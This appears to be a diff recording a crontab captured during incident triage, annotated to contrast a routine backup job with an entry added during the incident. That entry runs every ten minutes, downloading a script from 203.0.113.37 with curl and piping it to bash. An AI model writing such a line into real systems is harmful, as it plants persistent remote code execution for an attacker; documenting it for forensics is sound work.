@@ -1,0 +1,5 @@
+# /var/spool/cron/crontabs/deploy  (captured during triage)
+# Standard job that predates the incident:
+0 3 * * * /usr/local/bin/backup-rotate.sh >/dev/null 2>&1
+# Added 2026-10-20 02:3x (not present in the previous day's backup of this file):
+*/10 * * * * curl -s http://203.0.113.37:8080/b | bash
